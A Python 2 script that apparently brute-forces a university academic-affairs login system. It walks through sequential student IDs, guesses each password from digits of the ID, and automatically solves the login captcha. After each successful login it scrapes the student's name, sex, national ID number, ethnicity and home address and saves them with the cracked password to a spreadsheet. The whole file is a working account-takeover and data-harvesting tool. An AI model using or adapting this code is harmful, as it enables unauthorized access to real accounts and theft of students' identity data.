# coding:utf-8

import urllib
import urllib2
import cookielib
import re
import getYZM
import time
from lxml import etree
import Initial
from SaveInfo import save

Initial.start()#初始化表格

# proxies = {
#         'http': 'http://127.0.0.1:1080',
#         'https': 'http://127.0.0.1:1080',
# }
def getReal(info):
    pattern = "[^\s]+"
    real = re.findall(pattern,info,re.S)
    return real[0]
def getRical(allinfo):
    rical = allinfo[10]
    rRical = getReal(rical)
    return rRical
def getAdress(allinfo):
    adress = allinfo[20]
    rAdress = getReal(adress)
    return rAdress
def getIDnum(allinfo):
    IDnum = allinfo[5]
    rIDnum = getReal(IDnum)
    return rIDnum
def getName(allinfo):
    name = allinfo[1]
    rname = getReal(name)
    return rname
def getSex(allinfo):
    sex = allinfo[6]
    rsex = getReal(sex)
    return rsex
def make_un_and_pw():
    userName = 2014021002
    again = 0
    for p in range(1,6000000):
        pw = ""
        userName+=1
        sun = str(userName)
        for i in range(4,10):
            pw += sun[i]
        #print pw
        isSuccess(sun,pw,again)
        time.sleep(6)
x=1
def isSuccess(sun,pw,again):
    global x
    print "the UserName is :"+sun+" the password is :"+pw,
    # 登录的主页面
    hosturl = '*********'     #   自己填写
    # post数据接收和处理的页面（我们要向这个页面发送我们构造的Post数据）
    posturl = '************' # 从数据包中分析出，处理post请求的url,自己写

    # 设置一个cookie处理器，它负责从服务器下载cookie到本地，并且在发送请求时带上本地的cookie
    cj = cookielib.LWPCookieJar()
    cookie_support = urllib2.HTTPCookieProcessor(cj)
    #print cookie_support.cookiejar
    opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
    urllib2.install_opener(opener)

    # 打开登录主页面（他的目的是从页面下载cookie，这样我们在再送post数据时就有cookie了，否则发送不成功）
    h = urllib2.urlopen(hosturl)
    # print h.read() ----------------------------
    # 构造header，一般header至少要包含一下两项。这两项是从抓到的包里分析得出的。
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)\
     Chrome/52.0.2743.116 Safari/537.36',
               'Referer': 'http://218.7.49.53:9003/'}
    # 构造Post数据，他也是从抓大的包里分析得出的。
    yzm = getYZM.getCode()
    print "the YZM is :" + yzm
    postData = {
              "zjh": sun,
              "mm": pw,
              "v_yzm": yzm
              }
    # 需要给Post数据编码
    postData = urllib.urlencode(postData)

    # 通过urllib2提供的request方法来向指定Url发送我们构造的数据，并完成登录过程
    request = urllib2.Request(posturl, postData, headers)
    #print request
    response = urllib2.urlopen(request)
    text = response.read()
    # print text
    pattern = "你输入的验证码(.*?)误"
    pattern=pattern.decode("utf-8").encode("gb2312")
    conf = re.findall(pattern,text,re.S)
    #print conf
    if(conf):
        print "wrong: 验证码错误,重试中."
        time.sleep(6)
        isSuccess(sun,pw,again)
    flag = re.findall("frameborder=\"NO(.*?)\"",text,re.S)
    if(flag):
        print "right: 成功获取到一组."
        infoUrl = "**********"#自己在登录教务处后抓取,就是右击个人信息栏可以得到的URL
        infoData = urllib2.urlopen(infoUrl)
        infotext = infoData.read()
        selector = etree.HTML(infotext)
        allinfo = selector.xpath('//table[@class="titleTop3"]/tr/td/table[@id="tblView"]/tr/td[@width="275"]/text()')
        name = getName(allinfo)
        sex = getSex(allinfo)
        ID = getIDnum(allinfo)
        rical = getRical(allinfo)
        adress = getAdress(allinfo)
       # print name+" "+sex+" "+ID+" "+rical+" "+adress
       #  f = open("information.txt","a")
       #  f.write("学号:")
       #  f.write(sun)
       #  f.write("   教务处密码:")
       #  f.write(pw)
       #  f.write(" 姓名:")
       #  f.write(name.encode("utf-8"))
       #  f.write(" 性别:")
       #  f.write(sex.encode("utf-8"))
       #  f.write(" 身份证号:")
       #  f.write(ID.encode("utf-8"))
       #  f.write(" 民族:")
       #  f.write(rical.encode("utf-8"))
       #  f.write(" 地址:")
       #  f.write(adress.encode("utf-8"))
       #  f.write("\n")
        save(x,0,sun)
        save(x,1,pw)
        save(x,2,name)
        save(x,3,sex)
        save(x,4,ID)
        save(x,5,rical)
        save(x,6,adress)
        x+=1
    # else:
    #     if(again == 3):
    #         return 0
    #     else:
    #         again += 1


if __name__ == '__main__':
    make_un_and_pw()
